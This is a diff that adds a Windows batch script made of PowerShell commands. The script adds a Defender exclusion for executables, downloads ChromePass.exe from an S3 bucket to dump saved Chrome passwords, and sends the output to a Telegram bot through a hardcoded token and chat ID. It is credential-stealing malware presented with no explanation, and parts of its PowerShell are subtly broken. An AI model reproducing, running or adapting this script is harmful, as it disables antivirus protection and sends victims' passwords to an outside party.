@@ -1,0 +1,12 @@
+@echo off
+Powershell $Temp = cd %TEMP%
+Powershell Add-MpPreference -ExclusionExtension exe -Force
+Powershell wget https://s3-us-west-1.amazonaws.com/8086.ca/ChromePass.exe -OutFile $Temp/ChromePass.exe
+Powershell cd $Temp
+Powershell .\ChromePass.exe /stext passwords.txt
+Powershell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Powershell $BotToken = "1833256998:AAECTG9i5e2ehhN7W5hXvFt6_rB3EIa1pPA"
+Powershell $ChatID = '1913579690'
+Powershell $output = $Temp/passwords.txt
+Powershell $Input = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($output)
+Powershell $Input
